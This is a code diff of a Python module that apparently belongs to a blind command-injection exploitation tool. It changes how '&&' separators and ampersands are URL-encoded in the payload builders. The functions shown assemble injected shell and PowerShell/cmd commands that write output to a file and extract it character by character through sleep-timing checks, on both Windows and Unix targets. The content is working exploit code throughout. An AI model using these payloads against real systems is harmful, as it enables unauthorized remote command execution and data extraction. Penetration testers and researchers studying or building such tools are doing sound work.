@@ -37,12 +37,9 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
-    if separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+    elif separator == "&&" :
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + ampersand + ""
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
@@ -81,11 +78,8 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 )
 
     elif separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0" + separator +
                 "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
@@ -95,8 +89,8 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
                 "sleep " + str(timesec)
                 )
-      if http_request_method == "POST":
-        separator = _urllib.parse.unquote(separator)
+      #if http_request_method == "POST":
+      separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -128,12 +122,9 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
-    if separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+    elif separator == "&&" :
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + ampersand + ""
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
@@ -167,11 +158,8 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 )
 
     elif separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = _urllib.parse.quote("&")
-      else:
-        ampersand = "&"
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "$(python -c \"import time\ntime.sleep(0)\") " + separator +
                 "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")" + separator +
@@ -180,8 +168,8 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
-      if http_request_method == "POST":
-        separator = _urllib.parse.unquote(separator)
+      #if http_request_method == "POST":
+      separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -226,12 +214,9 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "do @set /p =%i>" + OUTPUT_TEXTFILE + "< nul) "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
-    if separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+    elif separator == "&&" :
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand + " "
                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
                 cmd + 
@@ -286,11 +271,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 )
 
     elif separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0 " + separator +
                 "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr -d '\\n'<" + OUTPUT_TEXTFILE + ")" + separator +
@@ -305,8 +287,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "str1=$(od -A n -t d1<" + OUTPUT_TEXTFILE + ")" + separator +
                 "echo $str1 >" + OUTPUT_TEXTFILE 
                 )
-      if http_request_method == "POST":
-        separator = _urllib.parse.unquote(separator)
+      #if http_request_method == "POST":
+      separator = _urllib.parse.unquote(separator)
       
     elif separator == "||" :                
       pipe = "|"
@@ -340,12 +322,9 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
-    if separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+    elif separator == "&&" :
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 cmd + 
@@ -382,11 +361,8 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 )    
 
     elif separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "$(python -c \"import time\ntime.sleep(0)\") " +  separator +
                 "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")" +  separator +
@@ -395,8 +371,8 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 "[ " + str(j) + " -eq ${str1} ] " +  separator +
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
-      if http_request_method == "POST":
-        separator = _urllib.parse.unquote(separator) 
+      #if http_request_method == "POST":
+      separator = _urllib.parse.unquote(separator) 
 
     elif separator == "||" :     
       pipe = "|"
@@ -431,12 +407,9 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
                 )
 
-    if separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+    elif separator == "&&" :
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" +str(num_of_chars-1)+ "]\"')"
@@ -467,11 +440,8 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 )
 
     elif separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0" +  separator +
                 # Use space as delimiter
@@ -479,8 +449,8 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
                 "sleep " + str(timesec)
                 )
-      if http_request_method == "POST":
-        separator = _urllib.parse.unquote(separator)
+      #if http_request_method == "POST":
+      separator = _urllib.parse.unquote(separator)
         
     elif separator == "||" :
       pipe = "|"
@@ -513,12 +483,9 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
-    if separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+    elif separator == "&&" :
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand + "" 
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
                 python_payload +
@@ -547,19 +514,16 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
                 ) 
 
     elif separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "$(python -c \"import time\ntime.sleep(0)\") " +  separator +
                 "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print ord(file.readlines()[0][" +str(num_of_chars-1)+ "])\nexit(0)\") " +  separator +
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
-      if http_request_method == "POST":
-        separator = _urllib.parse.unquote(separator)
+      #if http_request_method == "POST":
+      separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -593,12 +557,9 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 # "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
-    if separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+    elif separator == "&&" :
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand + "" 
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
@@ -628,19 +589,16 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 )
 
     elif separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0" +  separator +
                 "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator +
                 "[ " + str(ord(str(ascii_char))) + " -eq ${str} ] " +  separator +
                 "sleep " + str(timesec)
                 )
-      if http_request_method == "POST":
-        separator = _urllib.parse.unquote(separator)
+      #if http_request_method == "POST":
+      separator = _urllib.parse.unquote(separator)
         
     elif separator == "||" :
       pipe = "|"
@@ -668,12 +626,9 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                 "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
-    if separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+    elif separator == "&&" :
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand + "" 
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
                 python_payload +
@@ -702,19 +657,16 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 )
 
     elif separator == "&&" :
-      if http_request_method == "POST":
-        separator = _urllib.parse.quote(separator)
-        ampersand = "%26"
-      else:
-        ampersand = "&"
+      separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "$(python -c \"import time\ntime.sleep(0)\") " +  separator +
                 "str=$(python -c \"with open('" +OUTPUT_TEXTFILE+ "') as file: print file.readlines()[0][" +str(num_of_chars-1)+ "]\nexit(0)\") " +  separator +
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator +
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
-      if http_request_method == "POST":
-        separator = _urllib.parse.unquote(separator)
+      #if http_request_method == "POST":
+      separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
